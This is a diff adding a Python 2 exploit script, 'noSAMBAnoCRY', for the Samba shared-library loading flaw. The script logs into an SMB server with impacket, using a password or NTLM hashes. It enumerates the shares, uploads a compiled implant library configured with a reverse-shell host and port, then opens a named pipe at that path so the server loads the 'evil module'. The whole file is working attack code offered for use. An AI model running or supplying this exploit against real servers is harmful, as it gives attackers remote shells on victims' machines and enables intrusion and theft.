@@ -1,0 +1,178 @@
+#!/usr/bin/python
+
+from impacket.smbconnection import SMBConnection
+from impacket.dcerpc.v5 import transport, srvs
+import random
+from optparse import OptionParser
+import re
+import os
+from time import sleep
+import emoji
+from pyfiglet import Figlet
+
+
+f = Figlet(font='slant')
+print f.renderText('noSAMBAnoCRY')
+
+
+
+#print """
+#               _____ ___    __  _______  ___                ____________  __
+#   ____  ____ / ___//   |  /  |/  / __ )/   |  ____  ____  / ____/ __ \ \/ /
+#  / __ \/ __ \\__ \/ /| | / /|_/ / __  / /| | / __ \/ __ \/ /   / /_/ /\  /
+# / / / / /_/ /__/ / ___ |/ /  / / /_/ / ___ |/ / / / /_/ / /___/ _, _/ / /
+#/_/ /_/\____/____/_/  |_/_/  /_/_____/_/  |_/_/ /_/\____/\____/_/ |_| /_/
+
+#"""
+
+
+
+
+CONFIG_H = """#define SHELL_PORT %s
+#define SHELL_HOST "%s"
+#define SHELL_BINARY "%s"
+"""
+
+rName='*SMBSERVER'
+
+lib_name = "libimplantx64.so"
+
+class SmbExploder: 
+  def __init__(self, options): 
+    self.rhost = options.rhost 
+    self.rport = options.rport 
+    self.lhost = options.lhost 
+    self.lport = options.lport 
+    self.user = options.user 
+    self.hashes = options.hashes
+    self.smb = SMBConnection(rName, self.rhost, sess_port=int(self.rport))
+    self.shell = options.shell
+    self.cBin = options.cBin
+
+
+    if self.user is None: 
+      self.user = "" 
+    self.pwd = options.pwd 
+
+    if self.pwd is None: 
+      self.pwd = "" 
+
+    if self.hashes is not None:
+      self.lmhash, self.nthash = options.hashes.split(':')
+    else:
+      self.lmhash = ''
+      self.nthash = ''
+
+  def SMBpath(self, path):
+     pos = path.find(":")
+     if pos > -1:
+       path = path[pos+1:]
+       path = path.replace("\\", "/")
+     return path
+
+  def get_lib(self):
+    if (len(self.cBin) > 1) == 1:
+      print "[ ! ] Using Custom binary, hope payload works. [ ! ]"
+      return True
+
+    with open("config.h", "wb") as f:
+      f.write(CONFIG_H % (self.lport, self.lhost, self.shell))
+    print "[ + ] Compiling lib... [ + ]"
+    ret = os.system("make")
+    return ret == 0
+
+  def login(self):
+    self.smb = SMBConnection(rName, self.rhost, sess_port=int(self.rport))
+    self.smb.login(user=self.user, password=self.pwd, lmhash=self.lmhash, nthash=self.nthash)
+
+  def copy_lib(self, lib_name):
+
+    self.execName = os.path.basename(lib_name)
+    self.execFile = open(lib_name, 'rb')
+    self.login()
+    rpctransport = transport.SMBTransport(rName, self.rhost, filename=r'\srvsvc', smb_connection=self.smb)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+
+    dce.bind(srvs.MSRPC_UUID_SRVS)
+    resp = srvs.hNetrShareEnum(dce, 2)
+    for share in resp['InfoStruct']['ShareInfo']['Level2']['Buffer']:
+      sName = share['shi2_netname'][:-1]
+      sPath = self.SMBpath(share['shi2_path'][:-1])
+      k = str(sName) +":"+ str(sPath)
+      sName, sPath = k.split(':')
+#      module = sPath + "/" + lib_name
+      j = sName.replace('IPC$', '')
+      j = sName.replace('print$', '')
+      j = str(j)
+      shares = "".join([s for s in j.splitlines(True) if s.strip("\r\n")])
+      if not self.cBin:
+        lib_name = lib_name
+        module = sPath + "/" + lib_name
+      else:
+        lib_name = self.cBin
+        self.execName = os.path.basename(lib_name)
+        self.execFile = open(lib_name, 'rb')
+        module = sPath + "/" + lib_name
+#          shares = os.linesep.join([s for s in j.splitlines() if s])
+      for sharez in shares.splitlines():
+
+#        print sharez
+        print "[ + ] Using  %s [ + ]" % lib_name
+        print "[ + ] Copying lib '%s' to share '%s' [ + ]" % (lib_name, sharez)
+
+        self.smb.putFile(sharez, self.execName, self.execFile.read)
+        return module
+
+  def load_exp(self):
+    module = self.copy_lib(lib_name)
+    print "[ " + emoji.emojize(':skull:') + " ] Loading evil module [ " +emoji.emojize(':skull:') +" ]"
+    stringbinding = r'ncacn_np:%s[\pipe\%s]'% (self.rhost, module)
+    stb = transport.DCERPCStringBinding(stringbinding)
+    naddr = stb.get_network_address()
+    rpctransport = transport.SMBTransport(naddr, filename = module, smb_connection = self.smb)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+
+  def start_exp(self):
+    self.get_lib()
+    self.load_exp()
+
+def main(): 
+  pr = OptionParser() 
+   
+  pr.add_option("-r", "--rhost", dest="rhost", help="target ip address") 
+  pr.add_option("-p", "--rport", dest="rport", default=445, help="target port") 
+   
+  msg = "LHOST IP Reverse shell!" 
+  pr.add_option("--lhost", dest="lhost", help=msg) 
+   
+  msg = "LPORT for Reverse shell!" 
+  pr.add_option("--lport", dest="lport", default=60312, help=msg) 
+   
+  msg = "Username" 
+  pr.add_option("-u", "--user", dest="user", help=msg) 
+   
+  msg = "Pwd" 
+  pr.add_option("-P","--pwd", dest="pwd", help=msg) 
+
+  msg ="Hashes NTLM"
+  pr.add_option("--hashes",dest ="hashes", action="store", help=msg)   
+
+  msg = "Shell to use (by default /bin/sh)"
+  pr.add_option("-s", "--shell", dest="shell", default="/bin/sh", help=msg)
+
+  msg = "To run a custom .so"
+  pr.add_option("-c", "--cbin", dest="cBin", default="", help=msg)
+   
+
+  (options, args) = pr.parse_args() 
+  if options.rhost: 
+    exp = SmbExploder(options) 
+    if exp.start_exp():
+      print "Some many questions, did it work out???"
+  else: 
+    pr.print_help() 
+
+if __name__=="__main__": 
+  main()
